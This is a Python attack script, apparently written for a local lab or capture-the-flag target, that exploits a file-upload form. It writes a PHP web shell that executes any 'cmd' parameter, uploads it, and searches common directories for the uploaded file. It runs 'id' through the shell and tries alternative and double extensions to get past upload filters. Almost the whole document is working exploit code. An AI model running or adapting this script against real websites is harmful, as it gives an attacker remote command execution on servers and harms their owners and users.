import requests
import os

base_url = "http://127.0.0.1:32824"

# Create a simple PHP webshell
php_shell = """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>"""

# Save to a temporary file
with open('/tmp/shell.php', 'w') as f:
    f.write(php_shell)

print("Testing file upload vulnerability...")
print("=" * 60)

# First, check if there are any filters being applied
print("\n1. Testing with .php extension (direct shell)")
files = {'userfile': ('shell.php', open('/tmp/shell.php', 'rb'), 'application/octet-stream')}
data = {'submit': 'Upload Image'}

response = requests.post(f"{base_url}/index.php", files=files, data=data)
print(f"Status: {response.status_code}")
print(f"Response snippet: {response.text[:300]}")

# Check if the file was uploaded and where it might be accessible
# Common locations: upload/, uploads/, images/, files/
upload_dirs = ["/upload/", "/uploads/", "/images/", "/files/", "/"]

print("\n2. Checking for uploaded files in common directories...")
for directory in upload_dirs:
    shell_url = f"{base_url}{directory}shell.php"
    test_response = requests.get(shell_url)
    if test_response.status_code == 200:
        print(f"[SUCCESS] Shell found at: {shell_url}")
        print(f"Testing command execution...")
        # Test command execution
        cmd_response = requests.get(f"{shell_url}?cmd=id")
        print(f"Command 'id' output: {cmd_response.text}")
    else:
        print(f"  {directory}shell.php: {test_response.status_code}")

# If .php is blocked, try other extensions
print("\n3. Testing alternative extensions...")
alt_extensions = ['.phtml', '.php5', '.php4', '.php3', '.pht', '.phar', '.phps']

for ext in alt_extensions:
    alt_filename = f"shell{ext}"
    files = {'userfile': (alt_filename, open('/tmp/shell.php', 'rb'), 'application/octet-stream')}
    response = requests.post(f"{base_url}/index.php", files=files, data=data)
    
    # Check if it was uploaded
    for directory in upload_dirs:
        alt_url = f"{base_url}{directory}{alt_filename}"
        test_response = requests.get(alt_url)
        if test_response.status_code == 200:
            print(f"[SUCCESS] Shell with extension {ext} at: {alt_url}")
            cmd_response = requests.get(f"{alt_url}?cmd=id")
            if cmd_response.status_code == 200:
                print(f"Command execution works! Output: {cmd_response.text[:200]}")
            break
    else:
        print(f"  {ext}: Not successful")

# Try double extension
print("\n4. Testing double extensions...")
double_exts = ['.php.jpg', '.php.jpeg', '.php.png', '.php.gif']
for ext in double_exts:
    double_filename = f"shell{ext}"
    files = {'userfile': (double_filename, open('/tmp/shell.php', 'rb'), 'image/jpeg')}
    response = requests.post(f"{base_url}/index.php", files=files, data=data)
    
    # Check uploaded location
    for directory in upload_dirs:
        double_url = f"{base_url}{directory}{double_filename}"
        test_response = requests.get(double_url)
        if test_response.status_code == 200:
            print(f"[SUCCESS] Double extension {ext} at: {double_url}")
            cmd_response = requests.get(f"{double_url}?cmd=id")
            if cmd_response.status_code == 200:
                print(f"Command execution works! Output: {cmd_response.text[:200]}")
            break
    else:
        print(f"  {ext}: Not successful")

print("\n" + "=" * 60)
print("Upload testing complete.")
